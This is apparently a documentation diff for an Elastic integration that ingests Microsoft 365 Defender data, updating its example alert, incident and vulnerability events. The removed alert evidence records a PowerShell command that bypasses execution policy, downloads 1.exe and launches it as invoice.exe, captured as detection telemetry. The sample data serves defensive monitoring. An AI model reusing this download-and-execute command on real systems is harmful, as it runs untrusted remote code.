+        "hostname": [
+            "clw555test"
+        ],
         "id": [
             "505d70d89cfa3428f7aac7d2eb3a64c60fd3d843"
         ],
         "ip": [
-            "127.0.0.1"
+            "192.168.5.65",
+            "fe80::cfe4:80b:615c:38fb",
+            "127.0.0.1",
+            "::1"
         ],
         "os": {
             "name": [
@@ -243,67 +300,6 @@ An example event for `alert` looks as following:
                     "risk_score": "high",
                     "verdict": "unknown",
                     "version": "22H2"
-                },
-                {
-                    "created_datetime": "2023-10-20T09:53:10.193Z",
-                    "odata_type": "#microsoft.graph.security.userEvidence",
-                    "remediation_status": "none",
-                    "user_account": {
-                        "account_name": "CDPUserIS-38411",
-                        "domain_name": "AzureAD",
-                        "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
-                    },
-                    "verdict": "unknown"
-                },
-                {
-                    "created_datetime": "2023-10-20T09:53:10.193Z",
-                    "odata_type": "#microsoft.graph.security.urlEvidence",
-                    "remediation_status": "none",
-                    "url": "http://127.0.0.1/1.exe",
-                    "verdict": "suspicious"
-                },
-                {
-                    "created_datetime": "2023-10-20T09:53:10.193Z",
-                    "ip_address": "127.0.0.1",
-                    "odata_type": "#microsoft.graph.security.ipEvidence",
-                    "remediation_status": "none",
-                    "verdict": "suspicious"
-                },
-                {
-                    "created_datetime": "2023-10-20T09:53:10.193Z",
-                    "detection_status": "detected",
-                    "image_file": {
-                        "name": "powershell.exe",
-                        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
-                        "publisher": "Microsoft Corporation",
-                        "sha1": "a72c41316307889e43fe8605a0dca4a72e72a011",
-                        "sha256": "d783ba6567faf10fdff2d0ea3864f6756862d6c733c7f4467283da81aedc3a80",
-                        "size": 491520
-                    },
-                    "mde_device_id": "505d70d89cfa3428f7aac7d2eb3a64c60fd3d843",
-                    "odata_type": "#microsoft.graph.security.processEvidence",
-                    "parent_process": {
-                        "creation_datetime": "2023-10-20T09:51:19.506Z",
-                        "id": 5772,
-                        "image_file": {
-                            "name": "cmd.exe",
-                            "path": "C:\\Windows\\System32",
-                            "publisher": "Microsoft Corporation",
-                            "size": 323584
-                        }
-                    },
-                    "process": {
-                        "command_line": "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'",
-                        "creation_datetime": "2023-10-20T09:51:39.499Z",
-                        "id": 8224
-                    },
-                    "remediation_status": "none",
-                    "user_account": {
-                        "account_name": "CDPUserIS-38411",
-                        "domain_name": "AzureAD",
-                        "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
-                    },
-                    "verdict": "unknown"
                 }
             ],
             "first_activity_datetime": "2023-10-20T09:51:39.515Z",
@@ -338,49 +334,7 @@ An example event for `alert` looks as following:
         }
     },
     "message": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
-    "process": {
-        "command_line": [
-            "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'"
-        ],
-        "entity_id": [
-            "8224"
-        ],
-        "hash": {
-            "sha1": [
-                "a72c41316307889e43fe8605a0dca4a72e72a011"
-            ],
-            "sha256": [
-                "d783ba6567faf10fdff2d0ea3864f6756862d6c733c7f4467283da81aedc3a80"
-            ]
-        },
-        "parent": {
-            "entity_id": [
-                "5772"
-            ],
-            "pid": [
-                5772
-            ],
-            "start": [
-                "2023-10-20T09:51:19.506Z"
-            ]
-        },
-        "pid": [
-            8224
-        ],
-        "start": [
-            "2023-10-20T09:51:39.499Z"
-        ],
-        "user": {
-            "name": [
-                "CDPUserIS-38411"
-            ]
-        }
-    },
     "related": {
-        "hash": [
-            "a72c41316307889e43fe8605a0dca4a72e72a011",
-            "d783ba6567faf10fdff2d0ea3864f6756862d6c733c7f4467283da81aedc3a80"
-        ],
         "hosts": [
             "505d70d89cfa3428f7aac7d2eb3a64c60fd3d843",
             "Windows11",
@@ -389,11 +343,13 @@ An example event for `alert` looks as following:
             "AzureAD"
         ],
         "ip": [
-            "127.0.0.1"
+            "192.168.5.65",
+            "fe80::cfe4:80b:615c:38fb",
+            "127.0.0.1",
+            "::1"
         ],
         "user": [
-            "CDPUserIS-38411",
-            "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+            "CDPUserIS-38411"
         ]
     },
     "tags": [
@@ -415,14 +371,6 @@ An example event for `alert` looks as following:
                 ]
             }
         }
-    },
-    "user": {
-        "domain": [
-            "AzureAD"
-        ],
-        "name": [
-            "CDPUserIS-38411"
-        ]
     }
 }
 ```
@@ -955,11 +903,11 @@ An example event for `incident` looks as following:
 {
     "@timestamp": "2021-09-30T09:35:45.113Z",
     "agent": {
-        "ephemeral_id": "5aa5e360-7f01-44c9-9f9e-e937ce979f07",
-        "id": "a7b00d49-6bd4-4763-8f95-51625034832b",
-        "name": "elastic-agent-67823",
+        "ephemeral_id": "ea0e3074-38cf-4f33-88d6-cec07743a825",
+        "id": "50b0fe53-224a-4406-97f7-4fd963c16f5c",
+        "name": "elastic-agent-28076",
         "type": "filebeat",
-        "version": "8.18.1"
+        "version": "8.19.4"
     },
     "cloud": {
         "account": {
@@ -971,52 +919,33 @@ An example event for `incident` looks as following:
     },
     "data_stream": {
         "dataset": "m365_defender.incident",
-        "namespace": "38577",
+        "namespace": "82148",
         "type": "logs"
     },
     "ecs": {
         "version": "8.11.0"
     },
     "elastic_agent": {
-        "id": "a7b00d49-6bd4-4763-8f95-51625034832b",
+        "id": "50b0fe53-224a-4406-97f7-4fd963c16f5c",
         "snapshot": false,
-        "version": "8.18.1"
+        "version": "8.19.4"
     },
     "event": {
-        "action": [
-            "detected"
-        ],
         "agent_id_status": "verified",
         "created": "2021-08-13T08:43:35.553Z",
         "dataset": "m365_defender.incident",
-        "id": "2972395",
-        "ingested": "2025-06-03T13:18:39Z",
+        "id": "29723951",
+        "ingested": "2025-12-23T09:48:39Z",
         "kind": "alert",
-        "original": "{\"@odata.type\":\"#microsoft.graph.security.incident\",\"alerts\":{\"@odata.type\":\"#microsoft.graph.security.alert\",\"actorDisplayName\":null,\"alertWebUrl\":\"https://security.microsoft.com/alerts/da637551227677560813_-961444813?tid=b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\",\"assignedTo\":null,\"category\":\"DefenseEvasion\",\"classification\":\"unknown\",\"comments\":[],\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"description\":\"A hidden file has been launched. This activity could indicate a compromised host. Attackers often hide files associated with malicious tools to evade file system inspection and defenses.\",\"detectionSource\":\"antivirus\",\"detectorId\":\"e0da400f-affd-43ef-b1d5-afc2eb6f2756\",\"determination\":\"unknown\",\"evidence\":[{\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"azureAdDeviceId\":null,\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"defenderAvStatus\":\"unknown\",\"deviceDnsName\":\"tempDns\",\"firstSeenDateTime\":\"2020-09-12T07:28:32.4321753Z\",\"healthStatus\":\"active\",\"loggedOnUsers\":[],\"mdeDeviceId\":\"73e7e2de709dff64ef64b1d0c30e67fab63279db\",\"onboardingStatus\":\"onboarded\",\"osBuild\":22424,\"osPlatform\":\"Windows10\",\"rbacGroupId\":75,\"rbacGroupName\":\"UnassignedGroup\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"riskScore\":\"medium\",\"roles\":[\"compromised\"],\"tags\":[\"Test Machine\"],\"verdict\":\"unknown\",\"version\":\"Other\",\"vmMetadata\":{\"cloudProvider\":\"azure\",\"resourceId\":\"/subscriptions/8700d3a3-3bb7-4fbe-a090-488a1ad04161/resourceGroups/WdatpApi-EUS-STG/providers/Microsoft.Compute/virtualMachines/NirLaviTests\",\"subscriptionId\":\"8700d3a3-3bb7-4fbe-a090-488a1ad04161\",\"vmId\":\"ca1b0d41-5a3b-4d95-b48b-f220aed11d78\"}},{\"@odata.type\":\"#microsoft.graph.security.fileEvidence\",\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"detectionStatus\":\"detected\",\"fileDetails\":{\"fileName\":\"MsSense.exe\",\"filePath\":\"C:\\\\Program Files\\\\temp\",\"filePublisher\":\"Microsoft Corporation\",\"fileSize\":6136392,\"issuer\":null,\"sha1\":\"5f1e8acedc065031aad553b710838eb366cfee9a\",\"sha256\":\"8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec\",\"signer\":null},\"mdeDeviceId\":\"73e7e2de709dff64ef64b1d0c30e67fab63279db\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"verdict\":\"unknown\"},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"detectionStatus\":\"detected\",\"imageFile\":{\"fileName\":\"MsSense.exe\",\"filePath\":\"C:\\\\Program Files\\\\temp\",\"filePublisher\":\"Microsoft Corporation\",\"fileSize\":6136392,\"issuer\":null,\"sha1\":\"5f1e8acedc065031aad553b710838eb366cfee9a\",\"sha256\":\"8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec\",\"signer\":null},\"mdeDeviceId\":\"73e7e2de709dff64ef64b1d0c30e67fab63279db\",\"parentProcessCreationDateTime\":\"2021-08-12T07:39:09.0909239Z\",\"parentProcessId\":668,\"parentProcessImageFile\":{\"fileName\":\"services.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"filePublisher\":\"Microsoft Corporation\",\"fileSize\":731744,\"issuer\":null,\"sha1\":null,\"sha256\":null,\"signer\":null},\"processCommandLine\":\"\\\"MsSense.exe\\\"\",\"processCreationDateTime\":\"2021-08-12T12:43:19.0772577Z\",\"processId\":4780,\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"SYSTEM\",\"azureAdUserId\":null,\"domainName\":\"NT AUTHORITY\",\"userPrincipalName\":null,\"userSid\":\"S-1-5-18\"},\"verdict\":\"unknown\"},{\"@odata.type\":\"#microsoft.graph.security.registryKeyEvidence\",\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"registryHive\":\"HKEY_LOCAL_MACHINE\",\"registryKey\":\"SYSTEM\\\\CONTROLSET001\\\\CONTROL\\\\WMI\\\\AUTOLOGGER\\\\SENSEAUDITLOGGER\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"verdict\":\"unknown\"}],\"firstActivityDateTime\":\"2021-04-26T07:45:50.116Z\",\"id\":\"da637551227677560813_-961444813\",\"incidentId\":\"28282\",\"incidentWebUrl\":\"https://security.microsoft.com/incidents/28282?tid=b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\",\"lastActivityDateTime\":\"2021-05-02T07:56:58.222Z\",\"lastUpdateDateTime\":\"2021-05-02T14:19:01.3266667Z\",\"mitreTechniques\":[\"T1564.001\"],\"providerAlertId\":\"da637551227677560813_-961444813\",\"recommendedActions\":\"Collect artifacts and determine scope\\n�\\tReview the machine timeline for suspicious activities that may have occurred before and after the time of the alert, and record additional related artifacts (files, IPs/URLs) \\n�\\tLook for the presence of relevant artifacts on other systems. Identify commonalities and differences between potentially compromised systems.\\n�\\tSubmit relevant files for deep analysis and review resulting detailed behavioral information.\\n�\\tSubmit undetected files to the MMPC malware portal\\n\\nInitiate containment \\u0026 mitigation \\n�\\tContact the user to verify intent and initiate local remediation actions as needed.\\n�\\tUpdate AV signatures and run a full scan. The scan might reveal and remove previously-undetected malware components.\\n�\\tEnsure that the machine has the latest security updates. In particular, ensure that you have installed the latest software, web browser, and Operating System versions.\\n�\\tIf credential theft is suspected, reset all relevant users passwords.\\n�\\tBlock communication with relevant URLs or IPs at the organization�s perimeter.\",\"resolvedDateTime\":null,\"serviceSource\":\"microsoftDefenderForEndpoint\",\"severity\":\"low\",\"status\":\"new\",\"tenantId\":\"b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\",\"threatDisplayName\":null,\"threatFamilyName\":null,\"title\":\"Suspicious execution of hidden file\"},\"assignedTo\":\"KaiC@contoso.onmicrosoft.com\",\"classification\":\"truePositive\",\"comments\":[{\"comment\":\"Demo incident\",\"createdBy\":\"DavidS@contoso.onmicrosoft.com\",\"createdTime\":\"2021-09-30T12:07:37.2756993Z\"}],\"createdDateTime\":\"2021-08-13T08:43:35.5533333Z\",\"determination\":\"multiStagedAttack\",\"displayName\":\"Multi-stage incident involving Initial access \\u0026 Command and control on multiple endpoints reported by multiple sources\",\"id\":\"2972395\",\"incidentWebUrl\":\"https://security.microsoft.com/incidents/2972395?tid=12f988bf-16f1-11af-11ab-1d7cd011db47\",\"lastUpdateDateTime\":\"2021-09-30T09:35:45.1133333Z\",\"redirectIncidentId\":null,\"severity\":\"medium\",\"status\":\"active\",\"tags\":[\"Demo\"],\"tenantId\":\"b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\"}",
+        "original": "{\"@odata.type\":\"#microsoft.graph.security.incident\",\"alerts\":{\"@odata.type\":\"#microsoft.graph.security.alert\",\"actorDisplayName\":null,\"alertWebUrl\":\"https://security.microsoft.com/alerts/da637551227677560813_-961444813?tid=b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\",\"assignedTo\":null,\"category\":\"DefenseEvasion\",\"classification\":\"unknown\",\"comments\":[],\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"description\":\"A hidden file has been launched. This activity could indicate a compromised host. Attackers often hide files associated with malicious tools to evade file system inspection and defenses.\",\"detectionSource\":\"antivirus\",\"detectorId\":\"e0da400f-affd-43ef-b1d5-afc2eb6f2756\",\"determination\":\"unknown\",\"evidence\":[{\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"azureAdDeviceId\":null,\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"defenderAvStatus\":\"unknown\",\"deviceDnsName\":\"tempDns\",\"firstSeenDateTime\":\"2020-09-12T07:28:32.4321753Z\",\"healthStatus\":\"active\",\"loggedOnUsers\":[],\"mdeDeviceId\":\"73e7e2de709dff64ef64b1d0c30e67fab63279db\",\"onboardingStatus\":\"onboarded\",\"osBuild\":22424,\"osPlatform\":\"Windows10\",\"rbacGroupId\":75,\"rbacGroupName\":\"UnassignedGroup\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"riskScore\":\"medium\",\"roles\":[\"compromised\"],\"tags\":[\"Test Machine\"],\"verdict\":\"unknown\",\"version\":\"Other\",\"vmMetadata\":{\"cloudProvider\":\"azure\",\"resourceId\":\"/subscriptions/8700d3a3-3bb7-4fbe-a090-488a1ad04161/resourceGroups/WdatpApi-EUS-STG/providers/Microsoft.Compute/virtualMachines/NirLaviTests\",\"subscriptionId\":\"8700d3a3-3bb7-4fbe-a090-488a1ad04161\",\"vmId\":\"ca1b0d41-5a3b-4d95-b48b-f220aed11d78\"}}],\"firstActivityDateTime\":\"2021-04-26T07:45:50.116Z\",\"id\":\"da637551227677560813_-9614448132\",\"incidentId\":\"28282\",\"incidentWebUrl\":\"https://security.microsoft.com/incidents/28282?tid=b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\",\"lastActivityDateTime\":\"2021-05-02T07:56:58.222Z\",\"lastUpdateDateTime\":\"2021-05-02T14:19:01.3266667Z\",\"mitreTechniques\":[\"T1564.001\"],\"providerAlertId\":\"da637551227677560813_-961444813\",\"recommendedActions\":\"Collect artifacts and determine scope\\n�\\tReview the machine timeline for suspicious activities that may have occurred before and after the time of the alert, and record additional related artifacts (files, IPs/URLs) \\n�\\tLook for the presence of relevant artifacts on other systems. Identify commonalities and differences between potentially compromised systems.\\n�\\tSubmit relevant files for deep analysis and review resulting detailed behavioral information.\\n�\\tSubmit undetected files to the MMPC malware portal\\n\\nInitiate containment \\u0026 mitigation \\n�\\tContact the user to verify intent and initiate local remediation actions as needed.\\n�\\tUpdate AV signatures and run a full scan. The scan might reveal and remove previously-undetected malware components.\\n�\\tEnsure that the machine has the latest security updates. In particular, ensure that you have installed the latest software, web browser, and Operating System versions.\\n�\\tIf credential theft is suspected, reset all relevant users passwords.\\n�\\tBlock communication with relevant URLs or IPs at the organization�s perimeter.\",\"resolvedDateTime\":null,\"serviceSource\":\"microsoftDefenderForEndpoint\",\"severity\":\"low\",\"status\":\"new\",\"tenantId\":\"b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\",\"threatDisplayName\":null,\"threatFamilyName\":null,\"title\":\"Suspicious execution of hidden file\"},\"assignedTo\":\"KaiC@contoso.onmicrosoft.com\",\"classification\":\"truePositive\",\"comments\":[{\"comment\":\"Demo incident\",\"createdBy\":\"DavidS@contoso.onmicrosoft.com\",\"createdTime\":\"2021-09-30T12:07:37.2756993Z\"}],\"createdDateTime\":\"2021-08-13T08:43:35.5533333Z\",\"determination\":\"multiStagedAttack\",\"displayName\":\"Multi-stage incident involving Initial access \\u0026 Command and control on multiple endpoints reported by multiple sources\",\"id\":\"29723951\",\"incidentWebUrl\":\"https://security.microsoft.com/incidents/2972395?tid=12f988bf-16f1-11af-11ab-1d7cd011db47\",\"lastUpdateDateTime\":\"2021-09-30T09:35:45.1133333Z\",\"redirectIncidentId\":null,\"severity\":\"medium\",\"status\":\"active\",\"tags\":[\"Demo\"],\"tenantId\":\"b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\"}",
         "provider": "microsoftDefenderForEndpoint",
         "severity": 47,
         "url": "https://security.microsoft.com/incidents/2972395?tid=12f988bf-16f1-11af-11ab-1d7cd011db47"
     },
-    "file": {
-        "hash": {
-            "sha1": [
-                "5f1e8acedc065031aad553b710838eb366cfee9a"
-            ],
-            "sha256": [
-                "8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec"
-            ]
-        },
-        "name": [
-            "MsSense.exe"
-        ],
-        "path": [
-            "C:\\Program Files\\temp"
-        ],
-        "size": [
-            6136392
-        ]
-    },
     "host": {
+        "hostname": [
+            "tempDns"
+        ],
         "id": [
             "73e7e2de709dff64ef64b1d0c30e67fab63279db"
         ],
@@ -1084,70 +1013,10 @@ An example event for `incident` looks as following:
                             "subscription_id": "8700d3a3-3bb7-4fbe-a090-488a1ad04161",
                             "vm_id": "ca1b0d41-5a3b-4d95-b48b-f220aed11d78"
                         }
-                    },
-                    {
-                        "created_datetime": "2021-04-27T12:19:27.721Z",
-                        "detection_status": "detected",
-                        "file_details": {
-                            "name": "MsSense.exe",
-                            "path": "C:\\Program Files\\temp",
-                            "publisher": "Microsoft Corporation",
-                            "sha1": "5f1e8acedc065031aad553b710838eb366cfee9a",
-                            "sha256": "8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec",
-                            "size": 6136392
-                        },
-                        "mde_device_id": "73e7e2de709dff64ef64b1d0c30e67fab63279db",
-                        "odata_type": "#microsoft.graph.security.fileEvidence",
-                        "remediation_status": "none",
-                        "verdict": "unknown"
-                    },
-                    {
-                        "created_datetime": "2021-04-27T12:19:27.721Z",
-                        "detection_status": "detected",
-                        "image_file": {
-                            "name": "MsSense.exe",
-                            "path": "C:\\Program Files\\temp",
-                            "publisher": "Microsoft Corporation",
-                            "sha1": "5f1e8acedc065031aad553b710838eb366cfee9a",
-                            "sha256": "8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec",
-                            "size": 6136392
-                        },
-                        "mde_device_id": "73e7e2de709dff64ef64b1d0c30e67fab63279db",
-                        "odata_type": "#microsoft.graph.security.processEvidence",
-                        "parent_process": {
-                            "creation_datetime": "2021-08-12T07:39:09.090Z",
-                            "id": 668,
-                            "image_file": {
-                                "name": "services.exe",
-                                "path": "C:\\Windows\\System32",
-                                "publisher": "Microsoft Corporation",
-                                "size": 731744
-                            }
-                        },
-                        "process": {
-                            "command_line": "\"MsSense.exe\"",
-                            "creation_datetime": "2021-08-12T12:43:19.077Z",
-                            "id": 4780
-                        },
-                        "remediation_status": "none",
-                        "user_account": {
-                            "account_name": "SYSTEM",
-                            "domain_name": "NT AUTHORITY",
-                            "user_sid": "S-1-5-18"
-                        },
-                        "verdict": "unknown"
-                    },
-                    {
-                        "created_datetime": "2021-04-27T12:19:27.721Z",
-                        "odata_type": "#microsoft.graph.security.registryKeyEvidence",
-                        "registry_hive": "HKEY_LOCAL_MACHINE",
-                        "registry_key": "SYSTEM\\CONTROLSET001\\CONTROL\\WMI\\AUTOLOGGER\\SENSEAUDITLOGGER",
-                        "remediation_status": "none",
-                        "verdict": "unknown"
                     }
                 ],
                 "first_activity_datetime": "2021-04-26T07:45:50.116Z",
-                "id": "da637551227677560813_-961444813",
+                "id": "da637551227677560813_-9614448132",
                 "incident_id": "28282",
                 "incident_web_url": {
                     "domain": "security.microsoft.com",
@@ -1181,7 +1050,7 @@ An example event for `incident` looks as following:
             "created_datetime": "2021-08-13T08:43:35.553Z",
             "determination": "multiStagedAttack",
             "display_name": "Multi-stage incident involving Initial access & Command and control on multiple endpoints reported by multiple sources",
-            "id": "2972395",
+            "id": "29723951",
             "last_update_datetime": "2021-09-30T09:35:45.113Z",
             "odata_type": "#microsoft.graph.security.incident",
             "severity": "medium",
@@ -1200,67 +1069,14 @@ An example event for `incident` looks as following:
         }
     },
     "message": "Multi-stage incident involving Initial access & Command and control on multiple endpoints reported by multiple sources",
-    "process": {
-        "command_line": [
-            "\"MsSense.exe\""
-        ],
-        "entity_id": [
-            "4780"
-        ],
-        "hash": {
-            "sha1": [
-                "5f1e8acedc065031aad553b710838eb366cfee9a"
-            ],
-            "sha256": [
-                "8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec"
-            ]
-        },
-        "parent": {
-            "entity_id": [
-                "668"
-            ],
-            "pid": [
-                668
-            ],
-            "start": [
-                "2021-08-12T07:39:09.090Z"
-            ]
-        },
-        "pid": [
-            4780
-        ],
-        "start": [
-            "2021-08-12T12:43:19.077Z"
-        ],
-        "user": {
-            "name": [
-                "SYSTEM"
-            ]
-        }
-    },
-    "registry": {
-        "hive": [
-            "HKEY_LOCAL_MACHINE"
-        ],
-        "key": [
-            "SYSTEM\\CONTROLSET001\\CONTROL\\WMI\\AUTOLOGGER\\SENSEAUDITLOGGER"
-        ]
-    },
     "related": {
-        "hash": [
-            "5f1e8acedc065031aad553b710838eb366cfee9a",
-            "8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec"
-        ],
         "hosts": [
-            "tempDns",
-            "NT AUTHORITY"
+            "tempDns"
         ],
         "user": [
             "KaiC",
             "KaiC@contoso.onmicrosoft.com",
-            "DavidS@contoso.onmicrosoft.com",
-            "SYSTEM",
-            "S-1-5-18"
+            "DavidS@contoso.onmicrosoft.com"
         ]
     },
     "source": {
@@ -1508,26 +1324,26 @@ An example event for `vulnerability` looks as following:
 
 ```json
 {
-    "@timestamp": "2025-05-27T10:44:59.658Z",
+    "@timestamp": "2026-01-05T12:06:57.268Z",
     "agent": {
-        "ephemeral_id": "5f1f16e8-9234-4c2f-8497-bcbf282d23f5",
-        "id": "f145b2f6-c9f6-40bb-ba86-40ed3894824a",
-        "name": "elastic-agent-85182",
+        "ephemeral_id": "15548e80-a8ea-4a4c-baab-48929ef5392c",
+        "id": "d54bb79c-84f4-4b99-abc8-fc8158cedafe",
+        "name": "elastic-agent-64195",
         "type": "filebeat",
-        "version": "8.18.0"
+        "version": "8.19.4"
     },
     "data_stream": {
         "dataset": "m365_defender.vulnerability",
-        "namespace": "42235",
+        "namespace": "60777",
         "type": "logs"
     },
     "ecs": {
         "version": "8.17.0"
     },
     "elastic_agent": {
-        "id": "f145b2f6-c9f6-40bb-ba86-40ed3894824a",
+        "id": "d54bb79c-84f4-4b99-abc8-fc8158cedafe",
         "snapshot": false,
-        "version": "8.18.0"
+        "version": "8.19.4"
     },
     "event": {
         "agent_id_status": "verified",
@@ -1535,33 +1351,28 @@ An example event for `vulnerability` looks as following:
             "vulnerability"
         ],
         "dataset": "m365_defender.vulnerability",
-        "id": "94819846155826828d1603b913c67fe336d81295-_-CVE-2025-3074-_-microsoft-_-edge_chromium-based-_-134.0.3124.72-_--2025-05-27T10:45:00.675702254Z",
-        "ingested": "2025-05-27T10:45:00Z",
+        "id": "1212121212121212121212_red_hat_kernel_0:5.14.0-427.42.1.el9_4_CVE-2022-49226",
+        "ingested": "2026-01-05T12:06:58Z",
         "kind": "event",
-        "original": "{\"affectedMachine\":{\"aadDeviceId\":null,\"agentVersion\":\"30.124092.2.0\",\"computerDnsName\":\"bdp3449-ub20-2-4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01\",\"cveId\":\"CVE-2025-3074\",\"deviceValue\":\"Normal\",\"exclusionReason\":null,\"exposureLevel\":\"Low\",\"firstSeen\":\"2025-01-08T13:05:05.3483549Z\",\"fixingKbId\":null,\"healthStatus\":\"Inactive\",\"id\":\"94819846155826828d1603b913c67fe336d81295-_-CVE-2025-3074-_-microsoft-_-edge_chromium-based-_-134.0.3124.72-_-\",\"ipAddresses\":[{\"ipAddress\":\"216.160.83.56\",\"macAddress\":\"000C2910F1DA\",\"operationalStatus\":\"Up\",\"type\":\"Other\"}],\"isAadJoined\":false,\"isExcluded\":false,\"isPotentialDuplication\":false,\"lastExternalIpAddress\":\"1.128.0.0\",\"lastIpAddress\":\"175.16.199.0\",\"lastSeen\":\"2025-01-08T13:15:03.694371Z\",\"machineId\":\"94819846155826828d1603b913c67fe336d81295\",\"machineTags\":[\"test tag\"],\"managedBy\":\"MicrosoftDefenderForEndpoint\",\"managedByStatus\":\"Success\",\"mergedIntoMachineId\":null,\"onboardingStatus\":\"Onboarded\",\"osArchitecture\":\"64-bit\",\"osBuild\":6,\"osPlatform\":\"Ubuntu\",\"osProcessor\":\"x64\",\"osVersion\":null,\"productName\":\"edge_chromium-based\",\"productVendor\":\"microsoft\",\"productVersion\":\"134.0.3124.72\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"riskScore\":\"None\",\"severity\":\"Medium\",\"version\":\"20.4\",\"vmMetadata\":null},\"cveSupportability\":\"Supported\",\"cvssV3\":6.5,\"cvssVector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N/E:U/RL:O/RC:C\",\"description\":\"Summary: An inappropriate implementation in the Downloads feature of Google Chrome versions prior to 135.0.7049.52 could allow a remote attacker to perform UI spoofing via a crafted HTML page. This vulnerability, classified with a low severity by Chromium, may also enable bypassing security restrictions when a victim visits a specially crafted website. Impact: Exploitation of this vulnerability could lead to UI spoofing or bypassing security restrictions, potentially compromising user trust and security. AdditionalInformation: This vulnerability is associated with Google Chrome and has implications for Microsoft Edge (Chromium-based) due to shared code ingestion. Refer to Google Chrome Releases for further details. Remediation: Apply the latest patches and updates provided by the respective vendors. [Generated by AI]\",\"epss\":0.00111,\"exploitInKit\":false,\"exploitTypes\":[],\"exploitUris\":[],\"exploitVerified\":false,\"exposedMachines\":2,\"firstDetected\":\"2025-04-01T19:52:39Z\",\"id\":\"CVE-2025-3074\",\"name\":\"CVE-2025-3074\",\"patchFirstAvailable\":null,\"publicExploit\":false,\"publishedOn\":\"2025-04-01T00:00:00Z\",\"severity\":\"Medium\",\"tags\":[\"test\"],\"updatedOn\":\"2025-04-08T00:00:00Z\"}",
+        "original": "{\"CveBatchTitle\":\"Red_hat February 2025 Vulnerabilities\",\"CveBatchUrl\":\"https://security.access.redhat.com/data/oval/v2/RHEL9/rhel-9.8-eus.oval.xml.bz2\",\"CveId\":\"CVE-2022-49226\",\"CvssScore\":5.5,\"DeviceId\":\"1212121212121212121212\",\"DeviceName\":\"sample-host-1\",\"ExploitabilityLevel\":\"NoExploit\",\"FirstSeenTimestamp\":\"2025-10-06 10:43:58\",\"Id\":\"1212121212121212121212_red_hat_kernel_0:5.14.0-427.42.1.el9_4_CVE-2022-49226\",\"IsOnboarded\":true,\"LastSeenTimestamp\":\"2025-10-06 22:45:00\",\"OSArchitecture\":\"x64\",\"OSPlatform\":\"Linux\",\"OSVersion\":\"enterprise_linux_9.4\",\"RbacGroupId\":0,\"RbacGroupName\":\"Unassigned\",\"RecommendationReference\":\"va-_-red_hat-_-kernel\",\"RecommendedSecurityUpdate\":\"CVE-2022-49226_oval:com.redhat.rhsa:def:20249315\",\"RecommendedSecurityUpdateId\":\"RHSA-2024:9315\",\"RecommendedSecurityUpdateUrl\":\"https://access.redhat.com/errata/RHSA-2024:9315\",\"RegistryPaths\":[],\"SecurityUpdateAvailable\":true,\"SoftwareName\":\"kernel\",\"SoftwareVendor\":\"red_hat\",\"SoftwareVersion\":\"0:5.14.0-427.42.1.el9_4\",\"VulnerabilitySeverityLevel\":\"Medium\"}",
         "type": [
             "info"
         ]
     },
     "group": {
-        "id": "0"
+        "id": "0",
+        "name": "Unassigned"
     },
     "host": {
         "architecture": "x64",
-        "hostname": "bdp3449-ub20-2-4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
-        "id": "94819846155826828d1603b913c67fe336d81295",
-        "ip": [
-            "1.128.0.0"
-        ],
-        "name": "bdp3449-ub20-2-4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
